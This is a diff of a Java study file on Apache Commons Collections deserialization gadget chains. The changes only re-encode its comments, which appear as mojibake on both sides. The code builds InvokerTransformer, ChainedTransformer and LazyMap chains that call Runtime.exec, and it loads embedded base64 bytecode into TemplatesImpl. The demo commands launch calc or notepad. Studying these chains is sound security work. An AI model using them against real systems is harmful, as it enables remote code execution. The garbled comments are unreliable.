@@ -31,18 +31,18 @@ public class InvokerTransformerStudy {
     }
 
     public void testReflect() throws Exception{
-        //ÒÔ¸Ãpayload¾ÙÀı
+        //ä»¥è¯¥payloadä¸¾ä¾‹
         Runtime.getRuntime().exec("calc");
 
-        //Í¨¹ı·´Éäµ÷ÓÃ
-        //1¡¢Runtime.class.getMethod("getRuntime",null).invoke(null,null).exec("calc");
+        //é€šè¿‡åå°„è°ƒç”¨
+        //1ã€Runtime.class.getMethod("getRuntime",null).invoke(null,null).exec("calc");
         Runtime run = (Runtime) Runtime.class.getMethod("getRuntime", null).invoke(null, null);
         run.exec("calc");
 
         /**
-         * 2¡¢ÍêÈ«Í¨¹ı·´Éä·½Ê½µ÷ÓÃ£»invokeÖĞ´«ÈëµÄÊÇÒªÖ´ĞĞµÄ¶ÔÏó£¬²ÎÊı¡£getMethodÖĞ´«ÈëµÄÊÇÒªÖ´ĞĞµÄ·½·¨£»
-         * Q£ºÎªÊ²Ã´RuntimeÖ±½ÓÄÜ»ñÈ¡exec·½·¨¶ÔÏó£¿
-         * A£ºÒòÎªRuntime.classÊÇÀà£¬Òªµ÷ÓÃgetRuntime´´½¨ÊµÀı£¬ËùÒÔgetRuntimeÔÚµÚÒ»¸öinvokeº¯ÊıÖĞ
+         * 2ã€å®Œå…¨é€šè¿‡åå°„æ–¹å¼è°ƒç”¨ï¼›invokeä¸­ä¼ å…¥çš„æ˜¯è¦æ‰§è¡Œçš„å¯¹è±¡ï¼Œå‚æ•°ã€‚getMethodä¸­ä¼ å…¥çš„æ˜¯è¦æ‰§è¡Œçš„æ–¹æ³•ï¼›
+         * Qï¼šä¸ºä»€ä¹ˆRuntimeç›´æ¥èƒ½è·å–execæ–¹æ³•å¯¹è±¡ï¼Ÿ
+         * Aï¼šå› ä¸ºRuntime.classæ˜¯ç±»ï¼Œè¦è°ƒç”¨getRuntimeåˆ›å»ºå®ä¾‹ï¼Œæ‰€ä»¥getRuntimeåœ¨ç¬¬ä¸€ä¸ªinvokeå‡½æ•°ä¸­
          */
         Runtime.class.getMethod("exec",String.class)
                 .invoke(
@@ -53,10 +53,10 @@ public class InvokerTransformerStudy {
         Class.forName("java.lang.Runtime")
                 .getMethod("exec", String.class)
                 .invoke(
-                        //ĞèÒª´«ÈëgetRuntime¶ÔÏó£¬getRuntime¶ÔÏóÔõÃ´À´£¬·´ÉäµÃÀ´£¬Ö´ĞĞÕâ¸ögetRuntimeº¯Êı£¬·µ»ØÒ»¸ö¶ÔÏó¡£
+                        //éœ€è¦ä¼ å…¥getRuntimeå¯¹è±¡ï¼ŒgetRuntimeå¯¹è±¡æ€ä¹ˆæ¥ï¼Œåå°„å¾—æ¥ï¼Œæ‰§è¡Œè¿™ä¸ªgetRuntimeå‡½æ•°ï¼Œè¿”å›ä¸€ä¸ªå¯¹è±¡ã€‚
                         Class.forName("java.lang.Runtime")
                                 .getMethod("getRuntime")
-                                //ÕâÀïinvoke²ÎÊıÎªnull£¬ÒòÎª²»ĞèÒª·½·¨¶ÔÏó£¬±íÊ¾µ÷ÓÃ¾²Ì¬·½·¨
+                                //è¿™é‡Œinvokeå‚æ•°ä¸ºnullï¼Œå› ä¸ºä¸éœ€è¦æ–¹æ³•å¯¹è±¡ï¼Œè¡¨ç¤ºè°ƒç”¨é™æ€æ–¹æ³•
                                 .invoke(null)
                         ,"calc"
                 );
@@ -71,18 +71,18 @@ public class InvokerTransformerStudy {
 
 
     /**
-     * Ö»Òª´úÂëÖĞÓĞtransformer.transform()·½·¨µÄµ÷ÓÃ¼´¿É£¬ÎŞÂÛÀïÃæÊÇÊ²Ã´²ÎÊı£»
-     * ÒòÎªtransform()º¯ÊıÖĞ»áÍ¨¹ı·´Éäµ÷ÓÃÖ¸¶¨µÄ·½·¨
+     * åªè¦ä»£ç ä¸­æœ‰transformer.transform()æ–¹æ³•çš„è°ƒç”¨å³å¯ï¼Œæ— è®ºé‡Œé¢æ˜¯ä»€ä¹ˆå‚æ•°ï¼›
+     * å› ä¸ºtransform()å‡½æ•°ä¸­ä¼šé€šè¿‡åå°„è°ƒç”¨æŒ‡å®šçš„æ–¹æ³•
      */
     public void testInvokerTransform(){
-        //·µ»ØµÄÊÇtransformer¶ÔÏó£¬·½·¨Ãû¡¢²ÎÊıÀàĞÍ(new Class[])¡¢·½·¨/ĞèÒªÖ´ĞĞµÄ²ÎÊıµÄ¶ÔÏóÀàĞÍ(new Object[])
+        //è¿”å›çš„æ˜¯transformerå¯¹è±¡ï¼Œæ–¹æ³•åã€å‚æ•°ç±»å‹(new Class[])ã€æ–¹æ³•/éœ€è¦æ‰§è¡Œçš„å‚æ•°çš„å¯¹è±¡ç±»å‹(new Object[])
         Transformer transformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
-        //¸ÃtransformÊÇÖØĞ´µÄtransformº¯Êı£¬·´Éäµ÷ÓÃÖ¸¶¨µÄ·½·¨²¢·µ»Ø·½·¨µ÷ÓÃ½á¹û
+        //è¯¥transformæ˜¯é‡å†™çš„transformå‡½æ•°ï¼Œåå°„è°ƒç”¨æŒ‡å®šçš„æ–¹æ³•å¹¶è¿”å›æ–¹æ³•è°ƒç”¨ç»“æœ
         transformer.transform(Runtime.getRuntime());
     }
 
     public void testChain(){
-        //ChainedTransformer,Êı×éÁ´Ê½µ÷ÓÃ
+        //ChainedTransformer,æ•°ç»„é“¾å¼è°ƒç”¨
         Transformer[] transformers = new Transformer[] {
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
@@ -90,7 +90,7 @@ public class InvokerTransformerStudy {
                 new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"notepad"})
         };
         Transformer chainedTransformer = new ChainedTransformer(transformers);
-        //ÈçºÎ´¥·¢chainµÄtransform¾ÍºÜÖĞÖØÒªÁË
+        //å¦‚ä½•è§¦å‘chainçš„transformå°±å¾ˆä¸­é‡è¦äº†
         chainedTransformer.transform("test");
     }
 
@@ -105,14 +105,14 @@ public class InvokerTransformerStudy {
         );
 
         HashMap uselessMap = new HashMap();
-        //lazyMap:½«Ò»¸öMap¶ÔÏó×ª»»³ÉÁíÒ»¸öMap¶ÔÏó£¬ËùÒÔĞèÒª½ÓÊÜÆ÷Transform£¬µ±ĞÂµÄMap¶ÔÏó±»·ÃÎÊÊ±£¬lazyMap»á½«ÇëÇó´«µİ¸øÔ­Ê¼µÄMap£¬È»ºó×ª»»Æ÷´¦Àí½á¹û£¬·µ»ØĞÂµÄÖµ
+        //lazyMap:å°†ä¸€ä¸ªMapå¯¹è±¡è½¬æ¢æˆå¦ä¸€ä¸ªMapå¯¹è±¡ï¼Œæ‰€ä»¥éœ€è¦æ¥å—å™¨Transformï¼Œå½“æ–°çš„Mapå¯¹è±¡è¢«è®¿é—®æ—¶ï¼ŒlazyMapä¼šå°†è¯·æ±‚ä¼ é€’ç»™åŸå§‹çš„Mapï¼Œç„¶åè½¬æ¢å™¨å¤„ç†ç»“æœï¼Œè¿”å›æ–°çš„å€¼
         Map lazyMap = LazyMap.decorate(uselessMap, chainedTransformer);
-        //getº¯ÊıÖĞÓĞ¸öifÅĞ¶Ï£¬Èç¹ûMapÖĞ²»´æÔÚ¸Ã¼ü£¬»áÍ¨¹ıtransformChainÀ´´´½¨¶ÔÓ¦µÄÖµ²¢ÇÒ·Åµ½MapÖĞ£¬²¢·µ»Ø£¬ÄÇÃ´ÈçºÎµ÷ÓÃgetº¯ÊıÄØ
+        //getå‡½æ•°ä¸­æœ‰ä¸ªifåˆ¤æ–­ï¼Œå¦‚æœMapä¸­ä¸å­˜åœ¨è¯¥é”®ï¼Œä¼šé€šè¿‡transformChainæ¥åˆ›å»ºå¯¹åº”çš„å€¼å¹¶ä¸”æ”¾åˆ°Mapä¸­ï¼Œå¹¶è¿”å›ï¼Œé‚£ä¹ˆå¦‚ä½•è°ƒç”¨getå‡½æ•°å‘¢
         lazyMap.get("test");
     }
 
 
-    //·´ÉäÉèÖÃ Field
+    //åå°„è®¾ç½® Field
     public static void setFieldValue(Object object, String fieldName, Object value) {
         try {
             Field field = object.getClass().getDeclaredField(fieldName);
@@ -124,32 +124,32 @@ public class InvokerTransformerStudy {
     }
 
     public void testTemplate() throws TransformerConfigurationException {
-        //¶ñÒâ×Ö½ÚÂë
+        //æ¶æ„å­—èŠ‚ç 
         byte[] code = Base64.getDecoder().decode("yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");
-        //·´ÉäÉèÖÃ Field£¬TemplatesImplÀà²»ÔÚApache commonsÖĞ
+        //åå°„è®¾ç½® Fieldï¼ŒTemplatesImplç±»ä¸åœ¨Apache commonsä¸­
         TemplatesImpl templates = new TemplatesImpl();
         setFieldValue(templates, "_bytecodes", new byte[][]{code});
         setFieldValue(templates, "_name", "HelloTemplatesImpl");
         setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());
-        //ÕâÀïnewTransformerº¯Êı´´½¨Ò»¸öĞÂµÄTransformer¶ÔÏóµÄ·½·¨£¬cc-3µÄTrAXÓÃµ½ÁËÕâ¸öµ÷ÓÃ
+        //è¿™é‡ŒnewTransformerå‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„Transformerå¯¹è±¡çš„æ–¹æ³•ï¼Œcc-3çš„TrAXç”¨åˆ°äº†è¿™ä¸ªè°ƒç”¨
         templates.newTransformer();
     }
 
 
     public void testTrAXFilter(){
-        //×Ö½ÚÂë
+        //å­—èŠ‚ç 
         byte[] code = Base64.getDecoder().decode("yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");
 
-        //·´ÉäÉèÖÃ Field
+        //åå°„è®¾ç½® Field
         TemplatesImpl templates = new TemplatesImpl();
         setFieldValue(templates, "_bytecodes", new byte[][]{code});
         setFieldValue(templates, "_name", "HelloTemplatesImpl");
         setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());
 
-        //InstantiateTransformerµ÷ÓÃtransformº¯Êı´´½¨Ö¸¶¨ÀàµÄĞÂÊµÀı£¬µÚÒ»¸ö²ÎÊıÊÇÄ£°åÀà£¬µÚ¶ş¸ö²ÎÊı²ÎÊıÀàĞÍ
+        //InstantiateTransformerè°ƒç”¨transformå‡½æ•°åˆ›å»ºæŒ‡å®šç±»çš„æ–°å®ä¾‹ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ¨¡æ¿ç±»ï¼Œç¬¬äºŒä¸ªå‚æ•°å‚æ•°ç±»å‹
         Transformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
-        //transform()º¯ÊıÊÇ×öÅĞ¶Ï£¬´«ÈëTrAX£¬ÊÇ×öÅĞ¶Ï£¬ÅĞ¶Ï´«ÈëµÄ²ÎÊıÊÇ²»ÊÇinstanceof Class£¬Èç¹û°üº¬¾Íµ÷ÓÃnewInstanceº¯Êı£¬¸ù¾İInstantiateµÚ¶ş¸ö²ÎÊıÀ´´´½¨ÊµÀı
-        //TrAXÓÃÓÚ½«XMLÎÄµµ×ª»»³ÉÆäËû¸ñÊ½
+        //transform()å‡½æ•°æ˜¯åšåˆ¤æ–­ï¼Œä¼ å…¥TrAXï¼Œæ˜¯åšåˆ¤æ–­ï¼Œåˆ¤æ–­ä¼ å…¥çš„å‚æ•°æ˜¯ä¸æ˜¯instanceof Classï¼Œå¦‚æœåŒ…å«å°±è°ƒç”¨newInstanceå‡½æ•°ï¼Œæ ¹æ®Instantiateç¬¬äºŒä¸ªå‚æ•°æ¥åˆ›å»ºå®ä¾‹
+        //TrAXç”¨äºå°†XMLæ–‡æ¡£è½¬æ¢æˆå…¶ä»–æ ¼å¼
         instantiateTransformer.transform(TrAXFilter.class);
     }
 }
